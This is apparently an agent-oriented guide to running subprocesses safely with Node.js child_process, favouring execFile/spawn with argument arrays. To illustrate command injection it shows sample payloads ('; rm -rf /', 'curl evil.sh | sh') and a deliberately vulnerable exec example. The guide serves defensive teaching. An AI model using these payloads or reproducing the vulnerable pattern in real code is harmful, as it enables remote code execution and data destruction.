---
id: nodejs/11-child-process
topic: nodejs
slug: child-process
title: "Child Process"
type: doc
order: 11
status: ready
tags: [nodejs, child-process]
related: [nodejs/18-security, nodejs/12-worker-threads, nodejs/10-process, nodejs/06-streams, nodejs/16-error-handling]
when_to_use: "Read before shelling out to an external command or spawning a subprocess from Node."
---
# Child Process

## Purpose

This document defines how to run external programs from Node.js safely with the
`child_process` module: choosing between `spawn`, `execFile`, `exec`, and `fork`, passing
arguments without a shell, streaming output, and cleaning up children. It is written so an
agent can invoke a subprocess without opening a command-injection hole or leaking zombie
processes.

Shelling out is common — invoking `git`, `ffmpeg`, image tools, or your own scripts — and
it is one of the highest-risk operations in Node, because untrusted input plus a shell
equals remote code execution.

## Why It Matters

The single most dangerous function here is `exec` (and `execSync`): it runs its argument
through a shell (`/bin/sh -c`). Interpolate any user-controlled value into that string and
an attacker who supplies `; rm -rf /` or `$(curl evil.sh | sh)` runs arbitrary commands as
your process. This is the classic command-injection vulnerability, and it is trivial to
introduce with template strings. Beyond injection, subprocesses fail in operational ways:
`exec` buffers all output and truncates past `maxBuffer`; children not awaited or killed
become zombies; a child that outlives its parent leaks resources. Correct subprocess use is
mostly about avoiding the shell and always reaping the child.

## Core Principles

- **Never build a shell command from untrusted input.** Prefer `spawn`/`execFile` with the
  command and an **array of arguments** — no shell parses them, so injection is impossible.
  Reserve `exec` for fully static, trusted strings, if at all.
- **`exec` buffers; `spawn` streams.** `exec`/`execFile` collect all stdout/stderr into
  memory (bounded by `maxBuffer`, default ~1 MB) and can truncate. Use `spawn` for large or
  streaming output.
- **Always handle exit and error.** Check the exit `code`/`signal` and attach an `'error'`
  listener (fires when the binary is missing or cannot spawn). A non-zero exit is a failure.
- **Reap and bound your children.** Await completion or `kill()` on cleanup; set a timeout so
  a hung child cannot pin resources forever. Orphaned children become zombies.
- **`fork` is for Node children with IPC**, not for shelling out — it spawns a new Node
  process with a message channel, useful for CPU-bound Node work when workers do not fit.

## Best Practices

- Use `execFile(cmd, [args], opts)` or `spawn(cmd, [args], opts)` and pass every dynamic
  value as a separate array element; never string-concatenate into the command.
- Set `{ shell: false }` (the default for `spawn`/`execFile`) explicitly in security-sensitive
  code, and never set `shell: true` with untrusted input.
- Set a `timeout` and, for `spawn`, watch output size yourself; for `exec/execFile` set
  `maxBuffer` deliberately and handle the `ERR_CHILD_PROCESS_STDIO_MAXBUFFER` error.
- Stream large output with `spawn` piped through `pipeline` rather than buffering.
- Kill child processes on shutdown and on parent error; consider a process group so a
  timeout kills grandchildren too.
- Validate/allowlist the command name and, where possible, argument values before spawning.

## Examples

**Good Example** — `execFile` with an argument array; no shell, no injection

```js
import { execFile } from "node:child_process";
import { promisify } from "node:util";

const run = promisify(execFile);

async function gitLog(branch) {
  // branch is untrusted, but it is a discrete argv element — no shell interprets it,
  // so "; rm -rf /" is passed literally to git as a (harmless) ref name.
  const { stdout } = await run("git", ["log", "--oneline", branch], {
    timeout: 5_000,      // a hung git cannot pin the process forever
    maxBuffer: 1 << 20,  // explicit output cap
  });
  return stdout;
}
```

**Bad Example** — `exec` with interpolated input; command injection

```js
import { exec } from "node:child_process";

function gitLog(branch, cb) {
  // branch flows into a shell string. Input `main; curl evil.sh | sh` runs arbitrary
  // code as this process. Also buffers all output and truncates past maxBuffer.
  exec(`git log --oneline ${branch}`, (err, stdout) => cb(err, stdout));
  // No timeout: a stuck git hangs forever. Error path returns partial/undefined output.
}
```

## Common Mistakes

- Using `exec`/`execSync` with interpolated user input, creating command injection.
- Reaching for `shell: true` (or `exec`) when `spawn`/`execFile` with an args array would do.
- Buffering large subprocess output with `exec` and hitting silent `maxBuffer` truncation.
- Not attaching an `'error'` handler, so a missing binary throws an unhandled error.
- Ignoring the exit `code`/`signal` and treating any completion as success.
- Leaving children running (no `timeout`, no `kill` on shutdown), creating zombies.

## Production Tips

- Allowlist executables and resolve them to absolute paths; do not rely on the caller's
  `PATH`, which an attacker may influence.
- Kill children on `SIGTERM`: track spawned processes and `kill` them in the shutdown
  routine so a deploy does not orphan them.
- For CPU-bound work in Node, prefer worker threads over `fork`ing full Node processes —
  lower overhead and shared memory options.
- Log the command name and exit code (never the full interpolated command line if it can
  contain secrets) for auditability.

## AI Review Checklist

- Is every subprocess spawned with `spawn`/`execFile` and an argument array, not a shell
  string?
- Is `exec`/`shell: true` avoided for anything touching untrusted input?
- Is large output streamed via `spawn`, or is `maxBuffer` set and its error handled?
- Is there an `'error'` handler, and is the exit `code`/`signal` checked for failure?
- Is a `timeout` set, and are children killed on shutdown so none are orphaned?
- Is the executable allowlisted / resolved to an absolute path rather than trusting `PATH`?

## Related

- `knowledge/nodejs/18-security.md`
- `knowledge/nodejs/12-worker-threads.md`
- `knowledge/nodejs/10-process.md`
- `knowledge/nodejs/06-streams.md`
- `knowledge/nodejs/16-error-handling.md`
